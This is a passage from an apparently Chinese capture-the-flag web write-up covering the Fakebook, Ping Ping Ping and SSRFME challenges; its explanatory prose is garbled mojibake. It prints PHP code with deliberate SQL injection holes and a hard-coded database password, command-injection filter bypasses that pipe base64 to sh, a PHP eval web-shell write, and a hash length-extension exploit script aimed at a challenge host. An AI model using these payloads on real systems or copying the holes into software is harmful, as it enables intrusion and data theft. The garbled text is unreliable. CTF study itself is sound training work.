class=\"line\">    &lt;/table&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;hr&gt;</span><br><span class=\"line\">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;p&gt;the contents of his/her blog&lt;/p&gt;</span><br><span class=\"line\">    &lt;hr&gt;</span><br><span class=\"line\">    &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">    $response = $user-&gt;getBlogContents();</span><br><span class=\"line\">    if ($response === 404)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo &quot;404 Not found&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $base64 = base64_encode($response);</span><br><span class=\"line\">        echo &quot;&lt;iframe width=&apos;100%&apos; height=&apos;10em&apos; src=&apos;data:text/html;base64,&#123;$base64&#125;&apos;&gt;&quot;;</span><br><span class=\"line\">        // echo $response;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // var_dump($user-&gt;getBlogContents());</span><br><span class=\"line\">    ?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>db.php</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">require_once &apos;lib.php&apos;;</span><br><span class=\"line\">$mysqli = new mysqli(&apos;127.0.0.1&apos;, &apos;root&apos;, &apos;naiwjebfahjebfja&apos;, &apos;fakebook&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">class DB &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction __construct() &#123;</span><br><span class=\"line\">\t\t// $mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;!@#1234!@#&apos;, &apos;fakebook&apos;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function isValidUsername($username) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\">\t\t$query = &quot;select * from users where username = &apos;&#123;$username&#125;&apos;&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\">\t\tif (!$res-&gt;fetch_array()) &#123;</span><br><span class=\"line\">\t\t\treturn 1;</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\treturn 0;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction login($username, $passwd) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$username = addslashes($username);</span><br><span class=\"line\">\t\t$passwd = sha512($passwd);</span><br><span class=\"line\">\t\t$query = &quot;select * from users where username = &apos;&#123;$username&#125;&apos; and passwd = &apos;&#123;$passwd&#125;&apos;&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn $res-&gt;fetch_array();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction insertUser($username, $passwd, $data) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$username = substr($username, 0, 100);</span><br><span class=\"line\">\t\t$username = addslashes($username);</span><br><span class=\"line\">\t\t$passwd = sha512($passwd);</span><br><span class=\"line\">\t\t$data = serialize($data);</span><br><span class=\"line\">\t\t$data = addslashes($data);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$query = &quot;insert into users (username, passwd, data) values (&apos;&#123;$username&#125;&apos;, &apos;&#123;$passwd&#125;&apos;, &apos;&#123;$data&#125;&apos;)&quot;;</span><br><span class=\"line\">\t\treturn $mysqli-&gt;real_query($query);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function getAllUsers() &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$query = &quot;select * from users&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\">\t\treturn $res-&gt;fetch_all(MYSQLI_ASSOC);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function getUserByNo($no) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// $no = addslashes($no);</span><br><span class=\"line\">\t\t$query = &quot;select * from users where no = &#123;$no&#125;&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\">\t\tif (!$res) &#123;</span><br><span class=\"line\">\t\t\techo &quot;&lt;p&gt;[*] query error! (&#123;$mysqli-&gt;error&#125;)&lt;/p&gt;&quot;;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn $res-&gt;fetch_assoc();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function anti_sqli($no) &#123;</span><br><span class=\"line\">\t\t$patterns = &quot;/union\\Wselect|0x|hex/i&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn preg_match($patterns, $no);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\">CREATE TABLE `users` ( `no` INT NOT NULL AUTO_INCREMENT , `username` VARCHAR(100) NOT NULL , `passwd` VARCHAR(128) NOT NULL , `data` TEXT NOT NULL , PRIMARY KEY (`no`)) ENGINE = MyISAM;</span><br><span class=\"line\"></span><br><span class=\"line\"> */</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Ping-Ping-Ping\"><a href=\"#Ping-Ping-Ping\" class=\"headerlink\" title=\"Ping Ping Ping\"></a>Ping Ping Ping</h3><h4 id=\"å‘½ä»¤æ³¨å…¥\"><a href=\"#å‘½ä»¤æ³¨å…¥\" class=\"headerlink\" title=\"å‘½ä»¤æ³¨å…¥\"></a>å‘½ä»¤æ³¨å…¥</h4><p>å…ˆæµ‹è¯•ä»€ä¹ˆèƒ½ç”¨</p>\n<p>è¿‡æ»¤<code>&#39; ã€&quot; ã€ {}ã€ç©ºæ ¼ã€[]ã€*ã€?</code>ã€/</p>\n<p>ç»•è¿‡ç©ºæ ¼å¯ä»¥ <code>${IFS},$IFS,</code></p>\n<p>è¿™é‡Œ <code>$IFS</code> ç»•è¿‡ç©ºæ ¼</p>\n<p><code>127.0.0.1;ls$IFS-l</code> çœ‹åˆ° flag.phpã€‚ å°è¯•è¯» <code>127.0.0.1;cat$IFSflag.php</code>,è¿‡æ»¤äº† <code>flag</code> å…³é”®å­—ï¼Œå°è¯•ä¼ é©¬</p>\n<p> <code>;echo -e &quot;&lt;?php @eval(\\$_POST[122]);?&gt;&quot; &gt; 233.php</code> </p>\n<p>ä½†æ˜¯å› ä¸ºè¿‡æ»¤äº†å¼•å·ï¼Œä¹Ÿå¤±è´¥äº†ã€‚ç°åœ¨åªèƒ½å°è¯•æ„é€ å…³é”®å­— flag ã€‚</p>\n<p>å°è¯•å†…è”æ‰§è¡Œ</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;a=f;b=ag;c=l;cat$IFS$a$c$b.php</span><br></pre></td></tr></table></figure>\n\n<p>è¿™é‡Œéœ€è¦æ³¨æ„å®šä¹‰å˜é‡çš„é¡ºåº <code>acd</code> å°±ä¼šè¢«æ£€æµ‹å‡ºå«æœ‰ flagã€‚</p>\n<p>æ‰§è¡Œå®ŒæŸ¥çœ‹æºä»£ç å³å¯ã€‚</p>\n<p>è¿˜å¯ä»¥ç¼–ç ç»•è¿‡ï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh ==&gt; cat flag.php</span><br></pre></td></tr></table></figure>\n\n<p>å‚è€ƒï¼š</p>\n<p><a href=\"https://blog.csdn.net/silence1_/article/details/96135760\" target=\"_blank\" rel=\"noopener\">å‘½ä»¤æ³¨å…¥ç»•è¿‡</a></p>\n<h3 id=\"SSRFME\"><a href=\"#SSRFME\" class=\"headerlink\" title=\"SSRFME\"></a>SSRFME</h3><p>æºç ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#encoding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> request</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\">reload(sys)</span><br><span class=\"line\">sys.setdefaultencoding(<span class=\"string\">'latin1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">secert_key = os.urandom(<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Task</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, action, param, sign, ip)</span>:</span></span><br><span class=\"line\">        self.action = action</span><br><span class=\"line\">        self.param = param</span><br><span class=\"line\">        self.sign = sign</span><br><span class=\"line\">        self.sandbox = md5(ip)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">not</span> os.path.exists(self.sandbox)):          <span class=\"comment\">#SandBox For Remote_Addr</span></span><br><span class=\"line\">            os.mkdir(self.sandbox)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Exec</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        result = &#123;&#125;</span><br><span class=\"line\">        result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.checkSign()):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"scan\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                tmpfile = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">                resp = scan(self.param)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (resp == <span class=\"string\">\"Connection Timeout\"</span>):</span><br><span class=\"line\">                    result[<span class=\"string\">'data'</span>] = resp</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">print</span> resp</span><br><span class=\"line\">                    tmpfile.write(resp)</span><br><span class=\"line\">                    tmpfile.close()</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"read\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                f = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = f.read()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> result[<span class=\"string\">'code'</span>] == <span class=\"number\">500</span>:</span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = <span class=\"string\">\"Action Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">            result[<span class=\"string\">'msg'</span>] = <span class=\"string\">\"Sign Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">checkSign</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#generate Sign For Action Scan.</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(\"/geneSign\", methods=['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">geneSign</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    action = <span class=\"string\">\"scan\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> getSign(action, param)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    action = urllib.unquote(request.cookies.get(<span class=\"string\">\"action\"</span>))</span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    sign = urllib.unquote(request.cookies.get(<span class=\"string\">\"sign\"</span>))</span><br><span class=\"line\">    ip = request.remote_addr</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(waf(param)):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"No Hacker!!!!\"</span></span><br><span class=\"line\">    task = Task(action, param, sign, ip)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json.dumps(task.Exec())</span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> open(<span class=\"string\">\"code.txt\"</span>,<span class=\"string\">\"r\"</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scan</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    socket.setdefaulttimeout(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"Connection Timeout\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getSign</span><span class=\"params\">(action, param)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(content).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">waf</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    check=param.strip().lower()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check.startswith(<span class=\"string\">\"gopher\"</span>) <span class=\"keyword\">or</span> check.startswith(<span class=\"string\">\"file\"</span>):     </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    app.debug = <span class=\"literal\">False</span></span><br><span class=\"line\">    app.run(host=<span class=\"string\">'0.0.0.0'</span>,port=<span class=\"number\">80</span>)</span><br></pre></td></tr></table></figure>\n\n<p>åˆ†æä»£ç å¯çŸ¥ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/De1ta ä»æˆ‘ä»¬ä¼ å…¥çš„url å’Œ cookieä¸­å¾—åˆ°å‚æ•° -&gt; waf() ç¦ç”¨æ•æ„Ÿåè®® -&gt; Task() -&gt; Exec()</span><br><span class=\"line\"></span><br><span class=\"line\">-&gt; å…ˆæ£€æŸ¥Sign-checkSign()</span><br><span class=\"line\">     getSign(self.action, self.param) == self.sign</span><br><span class=\"line\">     hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class=\"line\">        </span><br><span class=\"line\">-&gt; åˆ¤æ–­åŠ¨ä½œ</span><br><span class=\"line\">\tscan-<span class=\"keyword\">if</span> <span class=\"string\">\"scan\"</span> <span class=\"keyword\">in</span> self.action <span class=\"comment\"># æ³¨æ„æ˜¯ in</span></span><br><span class=\"line\">    </span><br><span class=\"line\">       tmpfile = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">       resp = scan(self.param)</span><br><span class=\"line\">           urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">           <span class=\"keyword\">print</span> resp</span><br><span class=\"line\">           tmpfile.write(resp)</span><br><span class=\"line\">        </span><br><span class=\"line\">\tread-<span class=\"keyword\">if</span> <span class=\"string\">\"read\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">       f = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">       result[<span class=\"string\">'data'</span>] = f.read()</span><br></pre></td></tr></table></figure>\n\n<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¦å…ˆé€šè¿‡ <code>checkSign()</code> çš„æ£€æŸ¥ä»¥åæ‰èƒ½è¿›è¡Œä¸‹ä¸€æ­¥ã€‚è€Œåœ¨ä»£ç ä¸­ä¸“é—¨ç»™å‡ºä¸€ä¸ªè·¯ç”±ï¼Œå°†ç”Ÿæˆçš„ Sign å‘é€ç»™ç”¨æˆ·ï¼Œä¹Ÿå°±æ˜¯å‘Šè¯‰äº†æˆ‘ä»¬åŠ å¯†çš„ç»“æœã€‚</p>\n<p>äºæ˜¯ï¼Œæˆ‘çŸ¥é“äº† md5 åŠ å¯†çš„ä¸€ä¸ªç»“æœï¼Œä» <code>hashlib.md5(secert_key + param + action).hexdigest()</code> ä»¥åŠ <code>secert_key</code> é•¿åº¦å·²çŸ¥ï¼Œå¯ä»¥ä½¿ç”¨ <code>hash extend attack</code> æ¥æ„é€ åˆé€‚çš„<code>sign</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Input Signature: <span class=\"number\">9</span>f1d78f610b5e32249e30d1161ff4e81</span><br><span class=\"line\">Input Data: local_file:flag.txtscan</span><br><span class=\"line\">Input Key Length: <span class=\"number\">16</span></span><br><span class=\"line\">Input Data to Add: read</span><br><span class=\"line\"><span class=\"number\">4</span>a0fa89f8745038437386ca78367e28d</span><br><span class=\"line\">local_file:flag.txtscan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x008\\x01\\x00\\x00\\x00\\x00\\x00\\x00read</span><br></pre></td></tr></table></figure>\n\n<p>æˆ‘ä»¬æ³¨æ„åˆ°è¦å¾—åˆ°æ–‡ä»¶çš„å†…å®¹éœ€è¦ read in action , äºæ˜¯æˆ‘ä»¬å¡«å…… read ã€‚</p>\n<p>payload.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://a917963c-0d87-4c23-b312-40315cbdd792.node3.buuoj.cn\"</span></span><br><span class=\"line\">s = requests.session()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get Sign</span></span><br><span class=\"line\">route = <span class=\"string\">\"/geneSign\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">re1 = s.get(url + route+<span class=\"string\">\"?param=local_file:flag.txt\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> re1.content, re1.request.headers</span><br><span class=\"line\"></span><br><span class=\"line\">hashs = <span class=\"string\">\"4a0fa89f8745038437386ca78367e28d\"</span></span><br><span class=\"line\">action = <span class=\"string\">\"scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read\"</span></span><br><span class=\"line\"><span class=\"comment\"># action = a.replace(\"\\\\x\", \"%\")</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> action</span><br><span class=\"line\">cookie = &#123;</span><br><span class=\"line\">    <span class=\"string\">\"action\"</span>: action,</span><br><span class=\"line\">    <span class=\"string\">\"sign\"</span>: hashs,</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">route2 = <span class=\"string\">\"/De1ta\"</span></span><br><span class=\"line\">re2 = s.get(url + route2 + <span class=\"string\">\"?param=local_file:flag.txt\"</span>, cookies=cookie)</span><br><span class=\"line\"><span class=\"keyword\">print</span> re2.content</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Buy-Flag\"><a href=\"#Buy-Flag\" class=\"headerlink\" title=\"Buy Flag\"></a>Buy Flag</h3><p>æŸ¥çœ‹æºç 